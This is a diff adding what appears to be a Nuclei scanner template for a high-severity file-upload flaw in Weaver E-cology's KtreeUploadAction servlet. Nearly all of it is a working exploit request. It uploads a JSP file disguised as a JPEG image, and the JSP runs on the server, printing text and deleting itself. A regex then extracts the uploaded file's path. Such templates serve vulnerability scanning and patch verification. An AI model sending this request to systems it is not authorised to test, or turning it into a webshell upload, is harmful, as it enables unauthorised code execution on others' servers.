@@ -1,0 +1,31 @@
+id: WeaverE-cology-KtreeUploadAction-uploadfile
+
+info:
+  name: 泛微E-cology_com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction存在文件上传漏洞
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+      Connection: close
+      Content-Length: 295
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywgljfvib
+      Accept-Encoding: gzip
+
+      ------WebKitFormBoundarywgljfvib
+      Content-Disposition: form-data; name="test"; filename="2lXwA7OEDNjV0tEPqmTJjmYGcI3.jsp"
+      Content-Type: image/jpeg
+
+      <%out.print("Hello");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundarywgljfvib--
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "'url':'\\/.*\\/(\\d+\\.jsp)'"
+
